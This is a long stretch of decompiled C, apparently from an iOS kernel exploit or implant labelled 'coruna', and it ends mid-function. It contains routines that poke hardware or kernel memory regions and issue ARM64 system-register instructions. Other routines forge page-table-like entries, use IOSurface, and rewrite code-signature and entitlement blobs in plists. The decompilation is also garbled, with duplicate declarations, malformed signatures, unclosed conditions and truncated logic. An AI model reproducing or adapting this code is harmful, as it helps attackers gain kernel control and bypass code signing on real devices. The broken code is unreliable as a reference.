        version = (unsigned long)size_x;
        tag = arg;
        do {
          version = version - 1;
          u = *size;
          path_buf = 0;
          tmp_buf = 0;
          err = coruna_ctx_test_flag(val,0x200000);
          handle = -0x800000000;
          if (err != 0) {
            handle = -0x10000000000;
          }
          err = coruna_mach_absolute_time_20320(&bootargs,1,&tmp_buf);
          if ((err == 0) || (err = coruna_mach_absolute_time_20320(&bootargs,0,&path_buf), err == 0)) {
fail:
            port = 0;
            break;
          }
          size = tag;
          if (cache_20 != '\0') {
            err = coruna_mach_absolute_time_20560(&bootargs,0,handle + tag);
            if ((((err != 0) && (err = coruna_mach_absolute_time_2045c(&bootargs,0xd5087820), err != 0)) &&
                (err = coruna_mach_absolute_time_2045c(&bootargs,0xd5387400), err != 0)) &&
               ((err = coruna_mach_absolute_time_20320(&bootargs,0,&sa_new), err != 0 &&
                ((sa_new & 0xffffffffc000) == (tag & 0xffffffffffffc000))))) {
              size = handle + arg + addr * 4;
              err = coruna_mach_absolute_time_20560(&bootargs,0,size);
              coruna_mach_absolute_time_20560(&bootargs,1,tmp_buf);
              coruna_mach_absolute_time_20560(&bootargs,0,path_buf);
              port = 0;
              break;
            }
cleanup:
            coruna_mach_absolute_time_20560(&bootargs,1,tmp_buf);
            coruna_mach_absolute_time_20560(&bootargs,0,path_buf);
            port = 0;
            break;
          }
done:
          err = coruna_mach_absolute_time_20560(&bootargs,0,size);
          coruna_mach_absolute_time_20560(&bootargs,1,tmp_buf);
          coruna_mach_absolute_time_20560(&bootargs,0,path_buf);
          port = 0;
          break;
        } while (version != 0);
      }
      if (cache_20 != '\0') {
        coruna_kernel6544_via_mach_absolute_time_20560_2(val,&bootargs);
      }
      err = coruna_ctx_test_flag(val,0x84000);
      if ((err != 0) && (cache_20 != '\0')) {
        coruna_kernel2da10_via_mach_absolute_time_2045c_2(&bootargs,&scratch);
      }
      coruna_mach_absolute_time_201f0(&bootargs);
    }
    coruna_kernel6544_via_ctx_clear_31c54(val,&bootargs);
  }
  return port;
}





uint64_t coruna_kernel6544_via_nop_stub_6_4(uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  uint64_t u;
  long scratch;
  
  scratch = 0;
  u = coruna_kernel6544_via_return_zero_2e7b0(val,10,&scratch);
  if ((int)u != 0) {
    *(bool *)id_2 = scratch != 0;
    if (scratch == 0) {
      size_3[0xc] = 0;
      size_3[9] = 0;
      size_3[8] = 0;
      size_3[0xb] = 0;
      size_3[10] = 0;
      size_3[5] = 0;
      size_3[4] = 0;
      size_3[7] = 0;
      size_3[6] = 0;
      size_3[1] = 0;
      *size_3 = 0;
      size_3[3] = 0;
      size_3[2] = 0;
    }
    else {
      u = coruna_nop_stub_6(val,scratch,0x68,size_3);
      if ((int)u == 0) {
        return u;
      }
    }
    u = 1;
  }
  return u;
}
uint64_t coruna_kernel6544_via_cat_2(uint64_t val,long *handle,long *addr_2,uint32_t *size)
{
  long handle;
  int err;
  void *ptr;
  long addr;
  long off;
  long base;
  long ctx_val;
  long serial;
  
  err = coruna_ctx_test_flag(val,0x200000);
  handle = 0x800000000;
  if (err != 0) {
    handle = 0x10000000000;
  }
  ptr = _malloc(0x4000);
  if (ptr != (void *)0x0) {
    *size = 0x4000;
    addr = coruna_mach_port_request_notification(val,size);
    *handle = addr;
    if (addr != 0) {
      addr = coruna_kernel6544_via_nop_stub_3_4(val,addr);
      *addr_2 = addr;
      if (addr != 0) {
        addr = 0;
        off = k_kernel_rodata_word_3b240;
        base = k_kernel_rodata_word_0003b248;
        do {
          ctx_val = off * 0x2000000 + handle;
          serial = base * 0x2000000 + handle;
          ((unsigned long *)((long)ptr + addr))[1] =
               (unsigned long)coruna_cat(0xc0,coruna_cat((char)((unsigned long)serial >> 0x28),
                                             coruna_u64_pack14(((char)((unsigned long)serial >> 0x20)), (coruna_u64_pack13(((char))((unsigned long)serial >> 0x18)), (0x451))))
                              );
          *(unsigned long *)((long)ptr + addr) =
               (unsigned long)coruna_cat(0xc0,coruna_cat((char)((unsigned long)ctx_val >> 0x28),
                                             coruna_u64_pack14(((char)((unsigned long)ctx_val >> 0x20)), (coruna_u64_pack13(((char))((unsigned long)ctx_val >> 0x18)), (0x451))))
                              );
          off = off + 2;
          base = base + 2;
          addr = addr + 0x10;
        } while (addr != 0x4000);
        err = coruna_nop_stub_7(val,*handle,ptr,0x4000);
        _free(ptr);
        if (err != 0) {
          return 1;
        }
        if (*handle != 0) {
        coruna_mach_port_allocate(val,*handle,*size);
        *handle = 0;
        }
        return 0;
      }
    }
    _free(ptr);
  }
fail:
  if (*handle != 0) {
    coruna_mach_port_allocate(val,*handle,*size);
    *handle = 0;
  }
  return 0;
}





uint64_t coruna_mach_absolute_time_1f9f8(uint64_t val,long handle,uint64_t *id_2)
{
  uint64_t *ptr;
  uint64_t *buf;
  unsigned long u;
  bool err;
  int err;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  double ld11;
  double ld12;
  unsigned long type_id;
  mach_timebase_info_t scratch;
  uint bootargs;
  
  scratch.numer = 0;
  scratch.denom = 0;
  _mach_timebase_info(&scratch);
  type_id = (unsigned long)scratch & 0xffffffff;
  u = (unsigned long)scratch >> 0x20;
  size = _mach_absolute_time();
  id_2[1] = 0;
  *id_2 = 0;
  id_2[3] = 0;
  id_2[2] = 0;
  id_2[5] = 0;
  id_2[4] = 0;
  id_2[7] = 0;
  id_2[6] = 0;
  id_2[9] = 0;
  id_2[8] = 0;
  id_2[0xb] = 0;
  id_2[10] = 0;
  id_2[0xd] = 0;
  id_2[0xc] = 0;
  id_2[0xf] = 0;
  id_2[0xe] = 0;
  id_2[0x11] = 0;
  id_2[0x10] = 0;
  id_2[0x13] = 0;
  id_2[0x12] = 0;
  id_2[0x15] = 0;
  id_2[0x14] = 0;
  id_2[0x17] = 0;
  id_2[0x16] = 0;
  id_2[0x19] = 0;
  id_2[0x18] = 0;
  id_2[0x1b] = 0;
  id_2[0x1a] = 0;
  ptr = id_2 + 0x19;
  id_2[0x1d] = 0;
  id_2[0x1c] = 0;
  id_2[0x1f] = 0;
  id_2[0x1e] = 0;
  coruna_ptr_store(val,ptr);
  err = coruna_call_vm_protect(ptr,handle + 0x40000,id_2);
  if ((err != 0) || (err = coruna_call_vm_protect(ptr,handle + 0x10000,id_2 + 8), err != 0))
  coruna_kernel6544_via_ctx_clear_31c54(val,id_2);
  return 0;
}





uint64_t coruna_mach_absolute_time_1fc74(uint64_t val,long handle,byte arg,byte arg)
{
  long handle;
  bool err;
  double ld3;
  int err;
  uint u;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  unsigned long kind;
  bool status;
  byte flags;
  uint type_id;
  mach_timebase_info_t lm14;
  double ld15;
  double ld16;
  double ld17;
  double ld18;
  mach_timebase_info_t scratch;
  uint64_t bootargs;
  long thread_attr;
  unsigned long host_info;
  uint8_t scratch;
  uint serial_buf;
  uint32_t bootargs;
  unsigned long action;
  mach_timebase_info_t block_ctx [2];
  
  scratch.numer = 0;
  scratch.denom = 0;
  _mach_timebase_info(&scratch);
  ld3 = k_kernel_rodata_word_3b788;
  ld15 = (double)NEON_ucvtf((unsigned long)scratch >> 0x20);
  ld17 = (double)NEON_ucvtf((unsigned long)scratch & 0xffffffff);
  ld17 = (ld15 / ld17) * k_kernel_rodata_word_3b788;
  size = _mach_absolute_time();
  ld15 = k_kernel_rodata_word_3b4e0;
  ld17 = ld17 * k_kernel_rodata_word_3b7b0;
  handle = handle + 0x40;
  status = true;
  do {
    if ((status) && (err = coruna_ctx_test_flag(val,0x84000), err != 0)) {
      flags = (arg | arg) ^ 1;
    }
    else {
      flags = 0;
    }
    version = _mach_absolute_time();
    if ((unsigned long)(long)(ld17 + (double)size) <= version) {
      return 0;
    }
    if (((flags & 1) != 0) && (port = coruna_iosurface_lock_gles(val,handle + 0xd8), (int)port == 0)) {
      return port;
    }
    action = 0;
    serial_buf = 0;
    err = coruna_vm_region_slot_read(handle,0,&action);
    if (((err == 0) || ((action & 0x90000000) != 0)) ||
       (err = coruna_vm_region_slot_write(handle,0,action | 0x80000000), err == 0)) {
fail:
      if (*(char *)(handle + 0xc0) != '\0') {
        coruna_mach_absolute_time_201f0(handle);
      }
      return 0;
    }
    *(uint8_t *)(handle + 0xc0) = 1;
    bootargs = 0;
    block_ctx[0].numer = 0;
    block_ctx[0].denom = 0;
    _mach_timebase_info(block_ctx);
    ld16 = (double)NEON_ucvtf((unsigned long)block_ctx[0] >> 0x20);
    ld18 = (double)NEON_ucvtf((unsigned long)block_ctx[0] & 0xffffffff);
    version = _mach_absolute_time();
    do {
      tag = _mach_absolute_time();
      if (((unsigned long)(long)((ld16 / ld18) * ld3 * ld15 + (double)version) <= tag) ||
         if (*(char *)(handle + 0xc0) != '\0') {
         coruna_mach_absolute_time_201f0(handle);
         }
         return 0;
    } while ((bootargs >> 4 & 1) == 0);
    err = coruna_vm_region_read_u32(handle,0xfb4,&serial_buf);
    type_id = serial_buf;
    if (*(char *)(handle + 0xc0) != '\0') {
    coruna_mach_absolute_time_201f0(handle);
    }
    return 0;
  } while( true );
}





void coruna_kernel6544_via_ctx_clear_31c54(uint64_t val,long handle)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  coruna_dispatch_group_wait(val,handle + 0xd8);
  coruna_ctx_clear_31c54(handle + 0x80);
  coruna_ctx_clear_31c54(handle + 0x40);
  coruna_ctx_clear_31c54(handle);
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_ptr_clear(handle + 200);
  return;
}





uint64_t coruna_mach_absolute_time_201f0(long handle)
{
  int err;
  uint64_t u;
  uint64_t size;
  uint64_t version;
  double ld5;
  double ld6;
  unsigned long scratch;
  mach_timebase_info_t bootargs;
  uint64_t scratch;
  
  scratch = 0;
  if (*(char *)(handle + 0xc0) != '\0') {
    if ((*(char *)(handle + 0xd1) != '\0') &&
       (err = coruna_vm_region_write_u32(handle + 0x40,0x300,1), err != 0)) {
      *(uint8_t *)(handle + 0xd1) = 0;
    }
    if ((*(char *)(handle + 0xd0) != '\0') &&
       (err = coruna_vm_region_write_u32(handle + 0x40,0xfb0,0), err != 0)) {
      *(uint8_t *)(handle + 0xd0) = 0;
    }
    u = coruna_vm_region_slot_read(handle,0,&scratch);
    if ((int)u == 0) {
      return u;
    }
    scratch = scratch & 0xffffffff2fffffff | 0x40000000;
    u = coruna_vm_region_slot_write(handle,0);
    if ((int)u == 0) {
      return u;
    }
    bootargs.numer = 0;
    bootargs.denom = 0;
    scratch = 0;
    _mach_timebase_info(&bootargs);
    ld5 = (double)NEON_ucvtf((unsigned long)bootargs >> 0x20);
    ld6 = (double)NEON_ucvtf((unsigned long)bootargs & 0xffffffff);
    ld5 = (ld5 / ld6) * k_kernel_rodata_word_3b788;
    size = _mach_absolute_time();
    ld5 = ld5 * k_kernel_rodata_word_3b4e0;
    do {
      version = _mach_absolute_time();
      if (((unsigned long)(long)(ld5 + (double)size) <= version) ||
         (err = coruna_vm_region_slot_read(handle,0,&scratch), err == 0)) {
        return 0;
      }
    } while ((scratch >> 4 & 1) != 0);
    *(uint8_t *)(handle + 0xc0) = 0;
  }
  return 1;
}





uint64_t coruna_mach_absolute_time_20320(long handle,uint size,uint64_t *val)
{
  long handle;
  unsigned long u;
  mach_timebase_info_t lm3;
  int err;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  double ld8;
  mach_timebase_info_t scratch;
  uint bootargs;
  uint64_t thread_attr;
  
  thread_attr = 0;
  bootargs = 0;
  scratch.numer = 0;
  scratch.denom = 0;
  _mach_timebase_info(&scratch);
  lm3 = scratch;
  u = (unsigned long)scratch >> 0x20;
  handle = handle + 0x40;
  err = coruna_vm_region_write_u32(handle,0x84,size & 0xff | 0xd5130400);
  size = 0;
  if (err != 0) {
    ld8 = ((double)u / (double)((unsigned long)lm3 & 0xffffffff)) * k_kernel_rodata_word_3b788;
    version = _mach_absolute_time();
    ld8 = ld8 * k_kernel_rodata_word_3b4e0;
    do {
      port = _mach_absolute_time();
      if ((unsigned long)(long)(ld8 + (double)version) <= port) {
        return 0;
      }
      size = coruna_vm_region_read_u32(handle,0x88,&bootargs);
      if ((int)size == 0) {
        return size;
      }
    } while ((bootargs & 0x1000040) == 0);
    size = coruna_mach_absolute_time_206a8(handle);
    if ((((int)size != 0) &&
        (size = coruna_vm_region_read_u32(handle,0x8c,(long)&thread_attr + 4), (int)size != 0)) &&
       (size = coruna_vm_region_read_u32(handle,0x80,&thread_attr), (int)size != 0)) {
      *val = coruna_u64_pack(((uint32_t)thread_attr), (thread_attr));
      size = 1;
    }
  }
  return size;
}





void coruna_mach_absolute_time_2045c(uint64_t val,uint64_t *id_2)
{
  int err;
  uint64_t u;
  uint64_t size;
  unsigned long version;
  double ld5;
  double ld6;
  mach_timebase_info_t scratch;
  
  if (*(char *)(id_2 + 7) != '\0') {
    version = *(unsigned long *)*id_2;
    err = coruna_fn_ptr_cast_10(val,0x1100000);
    if (err != 0) {
      coruna_semaphore_timedwait(val,1000);
    }
    *(unsigned long *)*id_2 = version & 0xffffffff2fffffff | 0x40000000;
    scratch.numer = 0;
    scratch.denom = 0;
    _mach_timebase_info(&scratch);
    ld5 = (double)NEON_ucvtf((unsigned long)scratch >> 0x20);
    ld6 = (double)NEON_ucvtf((unsigned long)scratch & 0xffffffff);
    ld5 = (ld5 / ld6) * k_kernel_rodata_word_42ef0;
    u = _mach_absolute_time();
    ld5 = ld5 * k_kernel_rodata_word_434e8;
    do {
      size = _mach_absolute_time();
      if ((unsigned long)(long)(ld5 + (double)u) <= size) {
        return;
      }
    } while (((uint)*(uint64_t *)*id_2 >> 0x1c & 1) != 0);
    *(uint8_t *)(id_2 + 7) = 0;
  }
  return;
}





uint64_t coruna_mach_absolute_time_20560(long handle,uint size,unsigned long arg)
{
  long handle;
  uint u;
  int err;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  unsigned long tag;
  double ld8;
  double ld9;
  unsigned long kind;
  mach_timebase_info_t scratch;
  uint bootargs;
  
  bootargs = 0;
  scratch.numer = 0;
  scratch.denom = 0;
  _mach_timebase_info(&scratch);
  kind = (unsigned long)scratch & 0xffffffff;
  tag = (unsigned long)scratch >> 0x20;
  handle = handle + 0x40;
  err = coruna_vm_region_write_u32(handle,0x8c,arg >> 0x20);
  size = 0;
  if ((err != 0) && (size = coruna_vm_region_write_u32(handle,0x80,arg), (int)size != 0)) {
    ld8 = (double)NEON_ucvtf(tag);
    ld9 = (double)NEON_ucvtf(kind);
    ld8 = (ld8 / ld9) * k_kernel_rodata_word_3b788;
    version = _mach_absolute_time();
    ld8 = ld8 * k_kernel_rodata_word_3b4e0;
    do {
      port = _mach_absolute_time();
      if ((unsigned long)(long)(ld8 + (double)version) <= port) goto fail;
      size = coruna_vm_region_read_u32(handle,0x88,&bootargs);
      if ((int)size == 0) {
        return size;
      }
    } while ((bootargs & 0x40000040) == 0);
    if ((bootargs >> 6 & 1) == 0) {
      u = size & 0xff | 0xd5330400;
      tag = coruna_mach_absolute_time_2045c(handle,u);
      if (((tag & 1) != 0) || (size = coruna_mach_absolute_time_2045c(handle,u), (int)size != 0)) {
        size = 1;
      }
    }
    else {
      coruna_kernel6544_via_vm_region_read_u32(handle,0x90,0xfffffffb,4);
fail:
      size = 0;
    }
  }
  return size;
}





uint64_t coruna_mach_absolute_time_206a8(long handle)
{
  uint64_t u;
  uint64_t size;
  uint64_t version;
  double ld4;
  double ld5;
  mach_timebase_info_t scratch;
  uint bootargs;
  
  bootargs = 0;
  scratch.numer = 0;
  scratch.denom = 0;
  _mach_timebase_info(&scratch);
  ld4 = (double)NEON_ucvtf((unsigned long)scratch >> 0x20);
  ld5 = (double)NEON_ucvtf((unsigned long)scratch & 0xffffffff);
  ld4 = (ld4 / ld5) * k_kernel_rodata_word_3b788;
  u = _mach_absolute_time();
  ld4 = ld4 * k_kernel_rodata_word_3b4e0;
  do {
    size = _mach_absolute_time();
    if ((unsigned long)(long)(ld4 + (double)u) <= size) goto fail;
    version = coruna_vm_region_read_u32(handle + 0x40,0x88,&bootargs);
    if ((int)version == 0) {
      return version;
    }
  } while ((bootargs & 0x20000040) == 0);
  if ((bootargs >> 6 & 1) == 0) {
    version = 1;
  }
  else {
    coruna_kernel6544_via_vm_region_read_u32(handle,0x90,0xfffffffb,4);
fail:
    version = 0;
  }
  return version;
}





uint64_t coruna_kernel6544_via_vm_region_read_u32(long handle,uint64_t val,uint size,uint flags_2)
{
  int err;
  uint64_t u;
  uint scratch;
  
  scratch = 0;
  err = coruna_vm_region_read_u32(handle + 0x40,val,&scratch);
  u = 0;
  if (err != 0) {
    scratch = scratch & size | flags_2;
    u = coruna_vm_region_write_u32(handle + 0x40,val);
  }
  return u;
}





uint64_t coruna_kernel2da10_via_mach_absolute_time_2045c(uint64_t val)
{
  void (*ptr)(void);
  int err;
  uint64_t u;
  unsigned long unaff_x30;
  
  err = coruna_mach_absolute_time_2045c(val,0xd5033fdf);
  if (((err != 0) && (err = coruna_mach_absolute_time_2045c(val,0xd508871f), err != 0)) &&
     (err = coruna_mach_absolute_time_2045c(val,0xd5033f9f), err != 0)) {
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
    u = coruna_mach_absolute_time_2045c(val,0xd5033fdf);
    return u;
  }
  return 0;
}





void coruna_kernel6544_via_mach_absolute_time_20560_2(uint64_t val,long handle)
{
  int err;
  uint64_t scratch;
  uint64_t bootargs;
  uint8_t scratch;
  uint64_t thread_attr;
  
  err = coruna_ctx_test_flag(val,0x84000);
  if (((err == 0) && (err = coruna_kernel6544_via_nop_stub_6_4(val,&scratch,&scratch), err != 0)) &&
     (err = coruna_mach_absolute_time_20320(handle,0,&thread_attr), err != 0)) {
    err = coruna_mach_absolute_time_20560(handle,0,scratch);
    if (((err != 0) && (err = coruna_mach_absolute_time_2045c(handle,0xd5182040), err != 0)) &&
       ((err = coruna_mach_absolute_time_20560(handle,0,bootargs), err != 0 &&
        (err = coruna_mach_absolute_time_2045c(handle,0xd5182000), err != 0)))) {
      *(uint8_t *)(handle + 0xd2) = 0;
      coruna_kernel2da10_via_mach_absolute_time_2045c(handle);
    }
    coruna_mach_absolute_time_20560(handle,0,thread_attr);
  }
  return;
}





void coruna_kernel2da10_via_mach_absolute_time_2045c_2(uint64_t val,byte *arg)
{
  unsigned long u;
  void (*ptr)(void);
  int err;
  unsigned long unaff_x30;
  unsigned long scratch;
  uint64_t bootargs;
  
  scratch = 0;
  bootargs = 0;
  err = coruna_mach_absolute_time_20320(val,0,&bootargs);
  if (err == 0) {
    return;
  }
  err = coruna_mach_absolute_time_2045c(val,0xd5381000);
  if ((err != 0) && (err = coruna_mach_absolute_time_20320(val,0,&scratch), u = scratch, err != 0)) {
    if ((scratch & 1) == 0) {
      err = coruna_mach_absolute_time_20560(val,0,scratch | 1);
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
      ___stack_chk_fail();
      }
      coruna_mach_absolute_time_20560(val,0,bootargs);
      return;
    }
    if (arg != (byte *)0x0) {
      *arg = ~(byte)u & 1;
    }
  }
fail:
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_mach_absolute_time_20560(val,0,bootargs);
  return;
}





void coruna_kernel6544_via_nop_stub_6_5(long handle,uint64_t val,long *addr_2,byte arg,long *off_3)
{
  uint64_t u;
  unsigned long size;
  unsigned long *ptr;
  unsigned long version;
  int err;
  long handle;
  long addr;
  uint scratch;
  uint bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t scratch;
  uint64_t bootargs;
  unsigned long sa_saved;
  unsigned long sa_new;
  unsigned long thread_attr;
  unsigned long host_info;
  unsigned long path_buf;
  uint64_t tmp_buf;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t region;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t plist;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t url_buf;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t json_buf;
  long frame;
  
  frame = *(long *)k_kernel_stack_chk_guard_slot;
  action = 0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  thread_attr = 0;
  handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_2();
  addr = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot != frame) {
  ___stack_chk_fail(addr);
  }
  return;
}





uint64_t coruna_return_zero_24300(long handle,uint32_t *size,uint32_t *flags_2)
{
  int err;
  uint32_t u;
  uint32_t size;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      size = 0x240;
      u = 0x238;
    }
    else if (err == 0x1c1b) {
      size = 0x228;
      u = 0x220;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      u = 0x358;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        u = 0x2a8;
      }
      size = 0x360;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        size = 0x2b0;
      }
    }
  }
  else if (err < 0x225c) {
    if (err != 0x1f54 && err != 0x2258) {
      return 0;
    }
    size = 0x358;
    u = 0x350;
  }
  else {
    if (err != 0x225c && err != 0x2712) {
      return 0;
    }
    size = 0x550;
    u = 0x548;
  }
  *size = u;
  *flags_2 = size;
  return 1;
}





uint64_t coruna_iosurface_wire_meta_offsets(long handle,uint32_t *size,uint32_t *flags_2)
{
  int err;
  bool err;
  uint64_t u;
  int status;
  
  u = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  if (err || err == status) {
    if (size != (uint32_t *)0x0) {
      *size = 0x78;
    }
    if (flags_2 != (uint32_t *)0x0) {
      *flags_2 = 0x50;
    }
    u = 1;
  }
  return u;
}





void coruna_sha1_sha256(int flags,void *ctx,CC_LONG arg,void *scratch,uint *size)
{
  uint u;
  uint64_t size;
  CC_SHA512_CTX CStack_148;
  uchar scratch [48];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  if (flags - 1U < 4) {
    u = *(uint *)(&k_kernel_rodata_word_3b7d0 + (long)(int)(flags - 1U) * 4);
    if (u <= *size) {
      if (flags - 2U < 2) {
        _CC_SHA256_Init((CC_SHA256_CTX *)&CStack_148);
        _CC_SHA256_Update((CC_SHA256_CTX *)&CStack_148,ctx,arg);
        _CC_SHA256_Final(scratch,(CC_SHA256_CTX *)&CStack_148);
      }
      else if (flags == 4) {
        _CC_SHA384_Init(&CStack_148);
        _CC_SHA384_Update(&CStack_148,ctx,arg);
        _CC_SHA384_Final(scratch,&CStack_148);
      }
      else {
        size = 0;
        if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
        return;
        }
        ___stack_chk_fail(size);
      }
      _memcpy(scratch,scratch,(unsigned long)u);
      *size = u;
      size = 1;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(size);
    }
  }
fail:
  size = 0;
done:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(size);
}





uint64_t
void coruna_cfrelease(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
            long *handle,uint64_t *off_5,uint64_t off_6)
{
  int err;
  long handle;
  long addr;
  long off;
  uint64_t u;
  uint64_t scratch;
  
  handle = coruna_plist_from_bytes();
  if (handle == 0) {
    u = 0;
  }
  else {
    addr = coruna_plist_from_bytes(size_3,off_4);
    if (addr == 0) {
      u = 0;
    }
    else {
      err = coruna_kernel6544_via_cfdictionaryapplyfunction(handle,addr,off_6);
      if ((err == 0) || (off = coruna_cfpropertylistcreatedata(handle,&scratch), off == 0)) {
        u = 0;
      }
      else {
        *off_5 = scratch;
        *handle = off;
        u = 1;
      }
      _CFRelease(handle);
      handle = addr;
    }
    _CFRelease(handle);
  }
  return u;
}





long coruna_plist_from_bytes(uint64_t val,uint64_t id_2)
{
  int err;
  long handle;
  long addr;
  long off;
  long base;
  uint64_t u;
  long scratch;
  
  scratch = 0;
  u = *(uint64_t *)k_kernel_kcfallocatordefault_slot;
  handle = _CFReadStreamCreateWithBytesNoCopy
                    (u,val,id_2,*(uint64_t *)k_kernel_kcfallocatornull_slot);
  if (handle == 0) {
    return 0;
  }
  err = _CFReadStreamOpen();
  if (err == 0) {
    addr = 0;
    _CFRelease(handle);
    return addr;
  }
  addr = _CFPropertyListCreateWithStream(u,handle,0,2,0,&scratch);
  if (addr == 0) {
    addr = scratch;
    if (scratch != 0) goto done;
    addr = 0;
  }
  else {
    off = _CFGetTypeID();
    base = _CFDictionaryGetTypeID();
    if (off != base) {
done:
      _CFRelease(addr);
      addr = 0;
    }
  }
  _CFReadStreamClose(handle);
fail:
  _CFRelease(handle);
  return addr;
}





bool coruna_kernel6544_via_cfdictionaryapplyfunction(uint64_t val,uint64_t id_2,uint8_t *buf)
{
  int err;
  
  if (buf != (uint8_t *)0x0) {
    err = coruna_cfdictionaryapplyfunction_d26c(val,id_2);
    if (err == 0) {
      *buf = 1;
      return true;
    }
    *buf = 0;
  }
  err = coruna_cfdictionaryapplyfunction(val,id_2);
  return err == 0;
}





void * coruna_cfpropertylistcreatedata(uint64_t val,size_t *len)
{
  long handle;
  size_t ls2;
  void *ptr;
  void *buf;
  long scratch;
  
  scratch = 0;
  handle = _CFPropertyListCreateData
                    (*(uint64_t *)k_kernel_kcfallocatordefault_slot,val,100,0,&scratch);
  if (handle == 0) {
    handle = scratch;
    if (scratch == 0) {
      return (void *)0x0;
    }
  }
  else {
    ls2 = _CFDataGetLength();
    if (ls2 != 0) {
      ptr = _malloc(ls2);
      if (ptr != (void *)0x0) {
        buf = (void *)_CFDataGetBytePtr(handle);
        _memcpy(ptr,buf,ls2);
        *len = ls2;
      }
      _CFRelease(handle);
      return ptr;
    }
  }
  ptr = (void *)0x0;
fail:
  _CFRelease(handle);
  return ptr;
}





bool coruna_strlcpy_211f4(uint *size,uint64_t val,char *path)
{
  uint u;
  char *ptr;
  uint size;
  uint version;
  uint port;
  uint tag;
  bool err;
  int err;
  void *ptr;
  size_t ls11;
  void *buf;
  uint8_t scratch[104];
  uint kind;
  
  err = coruna_plist_dict_24a54(size,val,scratch);
  if (err == 0) {
    return false;
  }
  if ((*size & 0x5584001) == 0) {
    err = 0x1f52ffffffffff < *(unsigned long *)(size + 0x56);
  }
  else {
    err = true;
  }
  ptr = (void *)coruna_wire_map_lookup(scratch,0,0xfade0c02);
  if (ptr == (void *)0x0) {
fail:
    err = false;
  }
  else {
    size = *(uint *)((long)ptr + 0x14);
    port = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
    port = port >> 0x10 | port << 0x10;
    if (path == (char *)0x0) {
      if (size != 0) {
        buf = (void *)0x0;
        *(uint32_t *)((long)ptr + 0x14) = 0;
done:
        if (size != 0 && !err) {
          ptr = (char *)((long)ptr + (unsigned long)port);
          ls11 = _strlen(ptr);
          _bzero(ptr,ls11);
        }
cleanup:
        err = coruna_kernel6544_via_memcpy_24a7c(scratch,0,ptr);
        if (err == 0) {
          err = false;
        }
        else {
          err = coruna_kernel6544_via_ctx_test_flag_9(size,scratch);
          err = err != 0;
        }
        if (buf != (void *)0x0) {
          _free(buf);
        }
        coruna_kernel6544_via_kernel09_via_bzero_2(scratch);
        return err;
      }
    }
    else {
      version = *(uint *)((long)ptr + 4);
      if ((size == 0) ||
         (err = _strcmp((char *)((long)ptr + (unsigned long)port),path), err != 0)) {
        tag = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
        kind = tag >> 0x10 | tag << 0x10;
        ls11 = _strlen(path);
        tag = (int)ls11 + 1;
        if (err) {
          if (tag < 0x81) {
            kind = kind - 0x80;
            size = (kind & 0xff00ff00) >> 8 | (kind & 0xff00ff) << 8;
            *(uint *)((long)ptr + 0x14) = size >> 0x10 | size << 0x10;
            ptr = (char *)((long)ptr + (unsigned long)kind);
            ptr[0x68] = '\0';
            ptr[0x69] = '\0';
            ptr[0x6a] = '\0';
            ptr[0x6b] = '\0';
            ptr[0x6c] = '\0';
            ptr[0x6d] = '\0';
            ptr[0x6e] = '\0';
            ptr[0x6f] = '\0';
            ptr[0x60] = '\0';
            ptr[0x61] = '\0';
            ptr[0x62] = '\0';
            ptr[99] = '\0';
            ptr[100] = '\0';
            ptr[0x65] = '\0';
            ptr[0x66] = '\0';
            ptr[0x67] = '\0';
            ptr[0x78] = '\0';
            ptr[0x79] = '\0';
            ptr[0x7a] = '\0';
            ptr[0x7b] = '\0';
            ptr[0x7c] = '\0';
            ptr[0x7d] = '\0';
            ptr[0x7e] = '\0';
            ptr[0x7f] = '\0';
            ptr[0x70] = '\0';
            ptr[0x71] = '\0';
            ptr[0x72] = '\0';
            ptr[0x73] = '\0';
            ptr[0x74] = '\0';
            ptr[0x75] = '\0';
            ptr[0x76] = '\0';
            ptr[0x77] = '\0';
            ptr[0x48] = '\0';
            ptr[0x49] = '\0';
            ptr[0x4a] = '\0';
            ptr[0x4b] = '\0';
            ptr[0x4c] = '\0';
            ptr[0x4d] = '\0';
            ptr[0x4e] = '\0';
            ptr[0x4f] = '\0';
            ptr[0x40] = '\0';
            ptr[0x41] = '\0';
            ptr[0x42] = '\0';
            ptr[0x43] = '\0';
            ptr[0x44] = '\0';
